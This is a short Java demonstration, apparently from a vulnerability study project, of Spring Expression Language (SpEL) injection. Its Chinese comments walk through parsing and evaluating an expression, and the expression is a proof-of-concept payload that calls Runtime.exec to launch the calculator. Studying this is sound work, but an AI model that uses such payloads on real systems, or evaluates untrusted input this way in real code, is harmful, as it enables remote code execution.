package com.r17a.commonvuln.injection.expression.spel;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

/**
 * 参考：https://www.freebuf.com/vuls/197008.html
 * */
public class SpelTest {

    public static void main(String[] args) {
        new SpelTest().exp();
    }

    public void exp(){
        // 1.创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；
        ExpressionParser parser = new SpelExpressionParser();
        // 2.解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象。
        Expression expression = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec(\"calc\")");
        // 3.构造上下文：准备比如变量定义等等表达式需要的上下文数据。
        EvaluationContext context = new StandardEvaluationContext();
        // 4.求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值。
        Object value = expression.getValue(context);
        System.out.println(value);
    }
}